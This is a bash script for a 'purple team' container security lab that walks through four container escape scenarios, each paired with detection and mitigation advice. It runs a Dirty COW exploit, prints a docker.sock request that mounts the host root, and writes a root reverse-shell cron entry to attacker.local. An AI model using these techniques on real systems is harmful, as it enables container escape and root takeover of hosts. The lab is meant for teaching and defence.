#!/bin/bash

# Purple Team Container Security Lab Orchestrator
# Shows the 4 Pillars of Container Security: Vulnerability, Exploit, Detection, and Defense.

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

show_banner() {
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${CYAN}         Purple Team Container Security Attack Lab             ${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
}

diagnostics() {
    echo -e "${YELLOW}[*] Container Environment Diagnostics:${NC}"
    echo -e "  - Current Linux User  : $(whoami) (UID: $(id -u))"
    echo -e "  - Container OS Profile : $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
    echo -e "  - Shared Host Kernel  : $(uname -r)"
    echo ""
}

stage_1() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}   STAGE 1: Host Kernel Isolation (Dirty COW - CVE-2016-5195)   ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""
    
    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Host Kernel separation]${NC}"
    echo -e "  Container isolation relies on namespaces sharing the host Linux kernel."
    echo -e "  If the host kernel is vulnerable to a race condition (like CVE-2016-5195),"
    echo -e "  an unprivileged process inside a container can bypass memory writing rules."
    echo ""

    # 2. Exploit
    echo -e "${YELLOW}[2. THE EXPLOIT: Compiling & Triggering Race Threads]${NC}"
    TARGET_FILE="/var/secret/target.txt"
    echo -e "  - Target File: $TARGET_FILE (Owner: $(stat -c '%U' "$TARGET_FILE"), Perms: $(stat -c '%A' "$TARGET_FILE"))"
    echo -e "  - Original Contents: \"$(cat "$TARGET_FILE")\""
    
    gcc -pthread dirtyc0w.c -o dirtyc0w
    if [ $? -eq 0 ]; then
        echo -e "  - Compiled dirtyc0w successfully. Overwriting target file..."
        ./dirtyc0w "$TARGET_FILE" "DIRTY_COW_SUCCESS!!!" > /dev/null 2>&1
        
        # Verify success
        RESULT=$(cat "$TARGET_FILE")
        echo -e "  - Overwrite result: \"${CYAN}${RESULT}${NC}\""
        if [ "$RESULT" == "DIRTY_COW_SUCCESS!!!" ]; then
            echo -e "  - ${RED}Exploit Succeeded: The read-only root file was modified!${NC}"
        else
            echo -e "  - ${GREEN}Exploit Prevented: The host kernel serialized writes correctly.${NC}"
        fi
    else
        echo -e "  - ${RED}Exploit failed to compile!${NC}"
    fi
    echo ""

    # 3. Detection
    echo -e "${YELLOW}[3. DETECTION STRATEGY: System Call Auditing]${NC}"
    echo -e "  - Monitor syscall activity for high-frequency calls to ${CYAN}madvise(..., MADV_DONTNEED)${NC}."
    echo -e "  - Trigger alerts when processes open and write to ${CYAN}/proc/self/mem${NC} concurrently."
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Patching & Sandboxing]${NC}"
    echo -e "  - ${GREEN}Primary: Upgrade the host kernel to a patched release.${NC}"
    echo -e "  - Secondary: Employ secure micro-VM runtimes like ${CYAN}gVisor${NC} or ${CYAN}Kata Containers${NC}."
    echo -e "    These sandboxes intercept and handle system calls in a user-space kernel proxy,"
    echo -e "    completely isolating the host kernel from container syscall abuses."
    echo ""
}

stage_2() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}  STAGE 2: Namespace & Capabilities Isolation (CAP_SYS_PTRACE)  ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""

    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Process Boundary Enforcement]${NC}"
    echo -e "  Containers are isolated by namespaces (PID, IPC, Net, mount)."
    echo -e "  If host process sharing (${CYAN}--pid=host${NC}) is combined with debugging permissions"
    echo -e "  (${CYAN}CAP_SYS_PTRACE${NC}), container processes can inject code into host-level services."
    echo ""

    # 2. Exploit Simulation
    echo -e "${YELLOW}[2. THE EXPLOIT: Evaluating Capabilities & Namespace Sharing]${NC}"
    echo -e "  - checking granted capabilities..."
    CAPS=$(capsh --print 2>&1)
    echo -e "    --> Capabilities found: ${CYAN}$(echo "$CAPS" | grep "Current")${NC}"
    
    # Simulating PID namespace diagnostic
    CURRENT_PIDS=$(ps -e -o pid,comm | wc -l)
    echo -e "  - Process diagnostics:"
    echo -e "    --> Total running processes visible: ${CYAN}${CURRENT_PIDS}${NC}"
    if [ "$CURRENT_PIDS" -gt 30 ]; then
        echo -e "    --> ${RED}Warning: Shared PID Namespace detected! Host processes visible.${NC}"
        echo -e "    --> Exploit Vector: Process memory injection into host processes is possible via CAP_SYS_PTRACE."
    else
        echo -e "    --> ${GREEN}PID namespace is isolated. Host processes are hidden.${NC}"
    fi
    echo ""

    # 3. Detection
    echo -e "${YELLOW}[3. DETECTION STRATEGY: Scanning Configurations]${NC}"
    echo -e "  - Scan Kubernetes configurations and docker run directives for flags matching ${RED}hostPID: true${NC}."
    echo -e "  - Scan runtime environments for security profiles granting ${RED}CAP_SYS_PTRACE${NC} or ${RED}CAP_SYS_ADMIN${NC}."
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Drop Default Capabilities]${NC}"
    echo -e "  - ${GREEN}Never use the '--pid=host' configuration flag in untrusted environments.${NC}"
    echo -e "  - Configure container environments to drop all default capabilities and explicitly add only what's required:"
    echo -e "    ${CYAN}docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ...${NC}"
    echo ""
}

stage_3() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}       STAGE 3: Daemon & API Security (Exposed docker.sock)     ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""

    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Engine API Access Control]${NC}"
    echo -e "  The Docker daemon runs as root on the host. Accessing its UNIX socket"
    echo -e "  (${CYAN}/var/run/docker.sock${NC}) allows full engine control, letting processes"
    echo -e "  spawn high-privilege sibling containers with the host root directories mounted."
    echo ""

    # 2. Exploit Simulation
    echo -e "${YELLOW}[2. THE EXPLOIT: Inspecting Daemon Socket Interface]${NC}"
    SOCKET_PATH="/var/run/docker.sock"
    if [ -S "$SOCKET_PATH" ] || [ -f "$SOCKET_PATH" ]; then
        echo -e "  - ${RED}Exposed Socket Interface detected at $SOCKET_PATH!${NC}"
        echo -e "  - Simulating Host Daemon Control Hijack:"
        echo -e "    --> Constructing Docker API request payload..."
        echo -e "    --> Simulated command: ${CYAN}curl -X POST --unix-socket $SOCKET_PATH http://localhost/containers/create -d '{\"Image\":\"ubuntu\",\"Binds\":[\"/:/host\"]}'${NC}"
        echo -e "    --> ${RED}Exploit Potential: Full root takeover of the host filesystem via sibling mount!${NC}"
    else
        echo -e "  - ${GREEN}No docker.sock exposed. The Docker Daemon engine interface is safe.${NC}"
    fi
    echo ""

    # 3. Detection
    echo -e "${YELLOW}[3. DETECTION STRATEGY: Mount Auditing]${NC}"
    echo -e "  - Audit system image configurations for mounts containing ${RED}docker.sock${NC}."
    echo -e "  - Utilize runtime engines (e.g. Falco) to flag any raw HTTP or curl queries directed at socket files."
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Daemon Separation & rootless]${NC}"
    echo -e "  - ${GREEN}Never mount the Docker socket inside untrusted user containers.${NC}"
    echo -e "  - Primary Security Strategy: Run container engines in ${CYAN}Rootless Mode${NC},"
    echo -e "    so the daemon process runs inside a user namespace without host root access."
    echo -e "  - If read-only data query is needed, proxy socket operations via a secure API proxy like ${CYAN}Tecnativa's docker-socket-proxy${NC}."
    echo ""
}

stage_4() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}     STAGE 4: Volume & Filesystem Security (Cron Path Traversal) ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""

    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Volume Directory Isolation]${NC}"
    echo -e "  Mounting sensitive directories from the host (such as /etc, /var, or /opt)"
    echo -e "  gives containers read-write capability on host systems. A compromised container"
    echo -e "  can exploit write permissions to register arbitrary tasks in the host cron daemon."
    echo ""

    # 2. Exploit Simulation
    echo -e "${YELLOW}[2. THE EXPLOIT: Cron Job Path Traversal Injection]${NC}"
    SIMULATED_HOST_MOUNT="/mnt/host/etc/cron.d"
    echo -e "  - Checking mount status at simulated target: $SIMULATED_HOST_MOUNT"
    
    if [ -d "$SIMULATED_HOST_MOUNT" ]; then
        echo -e "  - Writable host mount detected at $SIMULATED_HOST_MOUNT!"
        echo -e "  - Attempting host cron-job traversal write..."
        echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.local/4444 0>&1'" > "$SIMULATED_HOST_MOUNT/exploit_task"
        
        if [ $? -eq 0 ]; then
            echo -e "    --> Exploit Task Written successfully to simulated host directory!"
            echo -e "    --> ${RED}Exploit Succeeded: Cron job written. Host will execute arbitrary script as ROOT in 60s!${NC}"
            # Clean up simulation artifact
            rm "$SIMULATED_HOST_MOUNT/exploit_task"
        else
            echo -e "    --> ${GREEN}Mount is configured as Read-Only. Overwrite rejected.${NC}"
        fi
    else
        echo -e "  - ${GREEN}No sensitive host filesystem directories are mounted as writable.${NC}"
    fi
    echo ""

    # 3. Detection
    echo -e "${YELLOW}[3. DETECTION STRATEGY: FIM & Audits]${NC}"
    echo -e "  - Configure **File Integrity Monitoring (FIM)** on critical host folders such as ${CYAN}/etc/cron*${NC}."
    echo -e "  - Implement auditing system rules (`auditd`) to flag container writing tasks matching system configuration directories."
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Read-Only Volumes & Least Privilege]${NC}"
    echo -e "  - ${GREEN}Always mount host filesystem volumes as read-only (ro flag):${NC}"
    echo -e "    ${CYAN}docker run -v /etc/config:/config:ro ubuntu${NC}"
    echo -e "  - Avoid mounting system directories (/etc, /var/run, /root) into containers."
    echo ""
}

# Orchestration router
case "$1" in
    --stage-1)
        show_banner
        stage_1
        ;;
    --stage-2)
        show_banner
        stage_2
        ;;
    --stage-3)
        show_banner
        stage_3
        ;;
    --stage-4)
        show_banner
        stage_4
        ;;
    --all|*)
        show_banner
        diagnostics
        stage_1
        stage_2
        stage_3
        stage_4
        ;;
esac
